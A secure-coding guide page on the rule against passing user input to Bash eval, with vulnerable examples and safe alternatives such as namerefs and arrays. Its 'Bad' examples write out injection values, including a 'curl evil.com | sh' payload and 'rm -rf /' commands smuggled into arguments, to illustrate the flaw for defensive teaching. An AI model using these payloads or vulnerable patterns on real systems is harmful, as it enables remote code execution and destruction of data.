# sec-no-eval-user

> Never use `eval` with user-supplied input

## Why It Matters

`eval` executes its arguments as shell code. When any part of the evaluated string comes from user input (command-line arguments, environment variables, file contents, network data), the user can inject arbitrary commands. This is a code execution vulnerability equivalent to SQL injection or `system()` injection in other languages.

## Bad

```bash
# eval with user input — CRITICAL vulnerability
eval "echo $user_arg"               # user_arg="\$(rm -rf /)" => disaster
eval "aws s3 cp $file $dest"        # file="\$(curl evil.com | sh)" => RCE
eval "$user_command"                # Full command injection

# Indirect eval with user input
eval "export $env_name=$env_value"  # env_value="a; rm -rf /" => game over
eval "${var}=\$value"               # var from user => injection
```

## Good

```bash
# Use nameref instead of eval
declare -n ref="$var_name"
ref="$new_value"

# Use indirect expansion (Bash 4.0+)
value="${!var_name}"

# Use printf %q to safely quote (still risky, avoid if possible)
safe_arg="$(printf '%q' "$user_arg")"

# Use associative arrays instead of dynamic variables
declare -A config
config["$key"]="$value"   # key and value are data, never executed

# Use command substitution and arrays
args=()
args+=("$user_provided_filename")  # Data, not code
aws s3 cp "${args[@]}" "$dest"

# Use getopts for structured input parsing
while getopts ":f:d:" opt; do
    case "$opt" in
        f) file="$OPTARG" ;;  # OPTARG is data, never executed
        d) dir="$OPTARG" ;;
    esac
done
```

## Defense Checklist

```bash
# 1. Never let user input reach eval
# 2. Use declare -n for indirect variable access
# 3. Use ${!var} for simple indirect expansion
# 4. Use arrays for argument lists
# 5. Use printf %q ONLY for display/quoting, not as primary defense
# 6. Validate with a whitelist, not a blacklist
```

## See Also

- [sec-sanitize-input](./sec-sanitize-input.md) - Input validation
- [var-indirect-reference](./var-indirect-reference.md) - Safe indirect access
- [anti-eval-everything](./anti-eval-everything.md) - The anti-pattern
